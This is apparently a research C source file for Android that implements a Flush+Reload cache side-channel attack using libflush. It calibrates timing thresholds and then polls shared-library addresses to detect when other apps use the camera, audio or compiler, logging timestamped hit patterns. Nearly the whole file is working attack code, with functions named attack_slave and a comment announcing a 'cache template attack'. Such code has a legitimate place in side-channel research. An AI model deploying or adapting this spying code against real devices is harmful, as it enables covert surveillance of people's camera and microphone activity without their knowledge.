/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"
#include "libflush.h"

#ifdef WITH_THREADS
#include <pthread.h>
#include <jni.h>
#include "threads.h"
#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif
#include <android/log.h>
static int shared_data_shm_fd = 0;
#endif

#include "hit.h"
#include "logoutput.h"
#include "calibrate.h"
#define BIND_TO_CPU 0

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))
/* Forward declarations */
static void
attack_slave(libflush_session_t *libflush_session,  int sum_length, pthread_mutex_t *g_lock, int compiler_position,
             int *continueRun, int threshold, int *flags, long *times, int *thresholds, int *logs,
             int* log_length, size_t *addr, int *camera_pattern, int *audio_pattern,
             int *length_of_camera_audio);
/*
#define TAG_NAME "libflush"
#define log_err(fmt,args...) __android_log_print(ANDROID_LOG_ERROR, TAG_NAME, (const char *) fmt, ##args)
*/

static void
attack_slaveX(libflush_session_t *libflush_session,  int sum_length, pthread_mutex_t *g_lock, int compiler_position,
        int *continueRun, int threshold, int *flags, long *times, int *thresholds, int *logs,
        int* log_length, size_t *addr, int *camera_pattern, int *audio_pattern,
        int *length_of_camera_audio){
    LOGD("Start Scaning.");
    struct timeval tv;//for quering time stamp
    /* Initialize libflush */
    libflush_init(&libflush_session, NULL);
    int turns = 0;
    int length = compiler_position;
    while(1) {
        size_t count;
        if(turns>=100000){
            LOGD("Turns %d",turns);
            length = compiler_position;
            turns = 0;
        }
        for (int j = 0; j < length; j++) {
            if(addr[j]==0)
                continue;
            if(j==2) continue;
            if (j == 1) {
                for (int i = 0; i < length_of_camera_audio[0]; i++) {
                    void* target = (void *) *((size_t *) addr[1] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, target);
                    if (count <= threshold) {
                        gettimeofday(&tv, NULL);
                        LOGD("Camera hit %d-%d-%d.", j, i, count);
                        //compiler
                        logs[*log_length] = 10000+i;
                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                        thresholds[*log_length] = count;

                        pthread_mutex_lock(g_lock);
                        *log_length = (*log_length+1)%99000;
                        camera_pattern[i] = 1;
                        flags[j] = 1;
                        pthread_mutex_unlock(g_lock);
                    }
                }
                for (int i = 0; i < length_of_camera_audio[1]; i++) {
                    void* target = (void *) *((size_t *) addr[j+1] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, target);
                    if (count <= threshold) {
                        gettimeofday(&tv, NULL);
                        LOGD("Audio hit %d-%d-%d.", j+1,i, count);
                        //compiler
                        logs[*log_length] = 20000+i;
                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                        thresholds[*log_length] = count;

                        pthread_mutex_lock(g_lock);
                        *log_length = (*log_length+1)%99000;
                        audio_pattern[i] = 1;
                        flags[j+1] = 1;
                        pthread_mutex_unlock(g_lock);
                    }
                }
            }
            else if(addr[j]!=0){//j==0 3
                void* target = (void *) addr[j];
                count = libflush_reload_address_and_flush(libflush_session, target);
                if(count<=threshold){
                    gettimeofday(&tv, NULL);
                    //compiler
                    logs[*log_length] = j;
                    times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                    thresholds[*log_length] = count;
                    pthread_mutex_lock(g_lock);
                    *log_length = (*log_length+1)%99000;
                    pthread_mutex_unlock(g_lock);
                    if(j<5) {
                        LOGD("Cache hit %d-%d.", j, count);
                        pthread_mutex_lock(g_lock);
                        *log_length = (*log_length+1)%99000;
                        flags[j] = 1;
                        pthread_mutex_unlock(g_lock);
                        if (j == 4) {
                            length = sum_length;
                        }
                    }
                }
            }
        }
        turns++;
        usleep(50);//sleep to reduce cpu usage
        while(*continueRun==0)
            sleep(1);
    }
    LOGD("Finish stage 1.1.\n");
}

void stage1_(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1,int sum_length){
    LOGD("Start stage 1.1.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    if(threshold==9999){//if caliberation failed
        return;
    }
    int turns = 0;
    int length = 5;
    while(*finishtrial1==0) {
        size_t count;
        if(turns>=100000){
            LOGD("Turns %d",turns);
            length = 5;
            turns = 0;
        }
        for (int j = 0; j < length; j++) {
            if(addr[j]==0)
                continue;
            if(j==2) continue;
            if (j == 1) {
                for (int i = 0; i < length_of_camera_audio[0]; i++) {
                    void* target = (void *) *((size_t *) addr[1] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, target);
                    if (count <= threshold) {
                        LOGD("Camera target %d-%p.", i, target);
                        *((size_t *) addr[1] + i) = 0;//target to 0
                        arr[i] = 1;
                        break;
                    }
                }
                for (int k = length_of_camera_audio[0];
                     k < length_of_camera_audio[0] + length_of_camera_audio[1]; k++) {
                    int i = k - length_of_camera_audio[0];
                    void* target = (void *) *((size_t *) addr[2] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, target);
                    if (count <= threshold) {
                        LOGD("Audio target %d-%p.", i, (void*)target);
                        *((size_t *) addr[2] + i) = 0;//target to 0
                        arr[k] = 1;
                        break;
                    }
                }
            }
            else if(addr[j]!=0){//j==0 3
                void* target = (void *) addr[j];
                count = libflush_reload_address_and_flush(libflush_session, target);
                if(count<=threshold&&j<4){
                    LOGD("Target %d-%d-%p.",j,(int)count,target);
                    //length = sum_length;
                }
                if(count<=threshold&&j==4){
                    LOGD("Compiler activated",j,count,addr[j]);
                    length = sum_length;
                }
            }
        }
        turns++;
        usleep(50);//sleep to reduce cpu usage
    }
    LOGD("Finish stage 1.1.\n");
    libflush_terminate(libflush_session);
}

void stage1(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1){
    LOGD("Start stage 1.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    if(threshold==9999){//if caliberation failed
        return;
    }
    while(*finishtrial1==0) {
        int max_n = 0;
        int index = 0;
        size_t temp = 0;
        size_t count;
        int n = 0;
        for(int x1=0;x1<length_of_camera_audio[0]+length_of_camera_audio[1];x1++) {//check which address raised more activation
            int nn[2] = {0};
            if (x1<length_of_camera_audio[0]&&*((size_t *) addr[1] + x1) == 0)
                continue;//if the addr is zero, no need to check
            if (x1>=length_of_camera_audio[0]&&*((size_t *) addr[2] + x1 - length_of_camera_audio[0]) == 0)
                continue;//if the addr is zero, no need to check
            for (int j = 0; j < 2; j++) {
                if (j == 1 && x1 < length_of_camera_audio[0]) {//
                    temp = *((size_t *) addr[1] + x1);
                    *((size_t *) addr[1] + x1) = 0;
                }
                if (j == 1 && x1 >= length_of_camera_audio[0]) {
                    temp = *((size_t *) addr[2] + x1 - length_of_camera_audio[0]);
                    *((size_t *) addr[2] + x1 - length_of_camera_audio[0]) = 0;
                }
                for (int i = 0; i < length_of_camera_audio[0]; i++) {
                    size_t target = *((size_t *) addr[1] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, (void*)target);
                    if (count <= threshold) {
                        //LOGD("Camera target %d-%p.", i, target);
                        nn[j]++;
                    }
                }
                for (int k = length_of_camera_audio[0];
                     k < length_of_camera_audio[0] + length_of_camera_audio[1]; k++) {
                    int i = k - length_of_camera_audio[0];
                    size_t target = *((size_t *) addr[2] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, (void*)target);
                    if (count <= threshold) {
                        //LOGD("Audio target %d-%p.", k, target);
                        nn[j]++;
                    }
                }
                if (j==1&&x1 < length_of_camera_audio[0]) {
                    *((size_t *) addr[1] + x1) = temp;
                }
                if(j==1&&x1 >= length_of_camera_audio[0]){
                    *((size_t *) addr[2] + x1 - length_of_camera_audio[0]) = temp;
                }
            }
            n = nn[0]-nn[1];//how many false activation are eliminated after setting index as 0
            if (n > max_n) {
                max_n = n;
                index = x1;
            }
        }
        //eliminate the address with more activations
        if(max_n<4) break;
        if(index<length_of_camera_audio[0]) {
            LOGD("Eliminate Camera Address %p %d",(void*)*((size_t *) addr[1] + index),max_n);
            *((size_t *) addr[1] + index) = 0;
        }
        else {
            LOGD("Eliminate Audio Address %p %d",(void*)*((size_t *) addr[2] + index - length_of_camera_audio[0]),max_n);
            *((size_t *) addr[2] + index - length_of_camera_audio[0]) = 0;
        }
        arr[index] = 1;
    }
    //stage1_(arr,threshold, length_of_camera_audio, addr, camera_audio, finishtrial1);
    LOGD("Finish stage 1.\n");
    libflush_terminate(libflush_session);
}

int
adjust_threshold(int threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1){
    LOGD("Start adjusting threshold.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    if(threshold==9999){//if caliberation failed
        return threshold;
    }
    size_t t=0;
    int f=0;
    while(1) {
        size_t n = 0;
        size_t count;
        int threshold_pre = threshold;
        for(int j=0;j<1000;j++) {
            for (int i = 0; i < length_of_camera_audio[0]; i++) {
                size_t target = *((size_t *) addr[1] + i);
                if (target == 0) {//if the target is 0, skip it.
                    continue;
                }
                count = libflush_reload_address_and_flush(libflush_session, (void *) target);
                if (count <= threshold) {
                    n++;
                }
            }
            for (int k = length_of_camera_audio[0];
                 k < length_of_camera_audio[0] + length_of_camera_audio[1]; k++) {
                int i = k - length_of_camera_audio[0];
                size_t target = *((size_t *) addr[2] + i);
                if (target == 0) {//if the target is 0, skip it.
                    continue;
                }
                count = libflush_reload_address_and_flush(libflush_session, (void*)target);
                if (count <= threshold) {
                    n++;
                }
            }
        }
        if(n>t/2||f==0){//if there is a big gap between two threshold
            f=1;
            t = n;
            threshold -= 20;
            LOGD("Threshold decrease to %d",threshold);
            if(threshold<0) {//if the caliberation went wrong, use the original threshold.
                libflush_terminate(libflush_session);
                return threshold_pre;
            }
            continue;
        }
        threshold += 20;
        break;
    }
    LOGD("Finish adjusting threshold with %d.\n",threshold);
    libflush_terminate(libflush_session);
    return threshold;
}

int hit(pthread_mutex_t *g_lock,int compiler_position, int *continueRun, int threshold, int *flags,
        long *times, int *thresholds, int *logs, int* log_length, int sum_length,
        size_t *addr,int *camera_pattern, int *audio_pattern, int *length_of_camera_audio)
{
    LOGD("Start.\n");
    for(int j=0;j<sum_length;j++) {
        if(addr[j]==0)
            continue;
        if (j == 1 || j == 2) {
            int c = j-1;
            for (int i = 0; i < length_of_camera_audio[c]; i++) {
                if(*((size_t*)addr[j]+i))
                    LOGD("address %d:%p", c, (void*)*((size_t*)addr[j]+i));
            }
            continue;
        }
        LOGD("address:%p", (void*)addr[j]);
    }

    /* Initialize libflush */
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    /* Start cache template attack */
    LOGD("[x] Threshold: %d\n", threshold);
    /* Start slaves */
    attack_slaveX(libflush_session,  sum_length, g_lock, compiler_position, continueRun,
                 threshold, flags, times, thresholds, logs, log_length,
                 addr, camera_pattern, audio_pattern, length_of_camera_audio);
    /* Terminate libflush */
    libflush_terminate(libflush_session);
    return 0;
}

//get the threshold
int get_threshold(){
    LOGD("Start get_threshold.\n");
    /* Initialize libflush */
    int threshold = 0;
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    /* Start calibration */
    //if (threshold == 0) {//try to get 3 times
        //fprintf(stdout, "[x] Start calibration... ");
    threshold = calibrate(libflush_session); //get the threshold
    LOGD("Currently the threshold is %d",threshold);
    if(threshold==9999)
        return threshold;
    /* Terminate libflush */
    //LOGD("Be adjusted to %d.\n",threshold);
    libflush_terminate(libflush_session);
    return threshold;
}
/*
void flush_address(size_t* address,int length){
    libflush_session_t* libflush_session;
    libflush_init(&libflush_session, NULL);
    for(int i=0;i<length;i++){
        if(address[i]!=0) {
            libflush_reload_address_and_flush(libflush_session, address[i]);
        }
    }
    LOGD("Clear Cache Scan");
    libflush_terminate(libflush_session);
}
*/
//when use static, the location function keeps poping
static void
attack_slave(libflush_session_t *libflush_session,  int sum_length, pthread_mutex_t *g_lock, int compiler_position,
             int *continueRun, int threshold, int *flags, long *times, int *thresholds, int *logs,
             int* log_length, size_t *addr, int *camera_pattern, int *audio_pattern,
             int *length_of_camera_audio) {
    struct timeval tv;//for quering time stamp
    //gettimeofday(&tv,NULL);
    libflush_init(&libflush_session, NULL);
    /* Run Flush and reload */
    //uint64_t start = libflush_get_timing(libflush_session);
    int turns = 0;
    int length = compiler_position;
    //*running = 1;
    LOGD("[x] start scaning %d",compiler_position);
    while(1){
      // if the turns reached 10000 or the same offset was hit more than many times repetitively, shrink the list;
        if(turns>=100000){
	        LOGD("Turns %d",turns);
            length = compiler_position;
	        turns = 0;
        }
        //Traverse all addresses
        for(int crt_ofs=0; crt_ofs<length; crt_ofs++){
            if(addr[crt_ofs]==0)
                continue;
            size_t count;
            size_t* target = (size_t *) addr[crt_ofs];
            if(crt_ofs==1||crt_ofs==2){
                int c = crt_ofs-1;
                for(int i=0;i<length_of_camera_audio[c];i++) {
                    //load the address into cache to count the time, and then flush out
                    if(*(target + i)==0)
                        continue;
                    //if(crt_ofs==2){
                    //    LOGD("[%d] cache hit %p %d", crt_ofs, *((size_t *)addr[crt_ofs] + i), count);
                    //}
                    count = libflush_reload_address_and_flush(libflush_session,
                                                              (void *) *(target + i));
                    if (count <= threshold) {
                        gettimeofday(&tv, NULL);
                        pthread_mutex_lock(g_lock);
                        flags[crt_ofs] = 1;//here I have got all functions' activation
                        pthread_mutex_unlock(g_lock);
                        LOGD("[%d] cache hit %d %d", crt_ofs, i, (int)count);
                        //get the pattern
                        pthread_mutex_lock(g_lock);
                        if(crt_ofs==1)
                            camera_pattern[i] = 1;
                        else
                            audio_pattern[i] = 1;
                        pthread_mutex_unlock(g_lock);
                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                        thresholds[*log_length] = (int) count;

                        pthread_mutex_lock(g_lock);
                        logs[(*log_length)++] = crt_ofs*10000+i;
                        pthread_mutex_unlock(g_lock);

                        if (*log_length >= 99000) {
                            LOGD("Log Length is larger than the threshold, set to 0.");
                            pthread_mutex_lock(g_lock);
                            *log_length = 0;
                            pthread_mutex_unlock(g_lock);
                        }

                    }
                }
                continue;
            }
            //load the address into cache to count the time, and then flush out
            count = libflush_reload_address_and_flush(libflush_session, (void *)target);
            //LOGD("cache hit %d %d", crt_ofs, count);
            if (count <= threshold) {
                gettimeofday(&tv, NULL);
                //LOGD("cache hit %p %d %ld", (void*) (addr[crt_ofs]),count, tv.tv_sec*1000+tv.tv_usec/1000);
                // if current offset is the switch of compiler, expand the list.
                if (crt_ofs == compiler_position - 1) {
                    LOGD("Compiler was activated.");
                    length = sum_length;
                    turns = 0;
                }
                //record the activation
                if (crt_ofs < compiler_position-1) {
                    pthread_mutex_lock(g_lock);
                    flags[crt_ofs] += 1;//here I have got all functions' activation
                    pthread_mutex_unlock(g_lock);
                    LOGD("cache hit %d %d %p", crt_ofs, (int)count, (void*)target);
                }
                if (*log_length >= 99000) {
                    LOGD("Log Length is larger than 50000, set to 0.");
                    pthread_mutex_lock(g_lock);
                    *log_length = 0;
                    pthread_mutex_unlock(g_lock);
                }
                times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                thresholds[*log_length] = (int) count;

                pthread_mutex_lock(g_lock);
                logs[(*log_length)++] = crt_ofs;
                pthread_mutex_unlock(g_lock);
            }
        }//traverse all functions
        turns++;
        usleep(50);//sleep to reduce cpu usage
        while(*continueRun==0)
            sleep(1);
    }
}



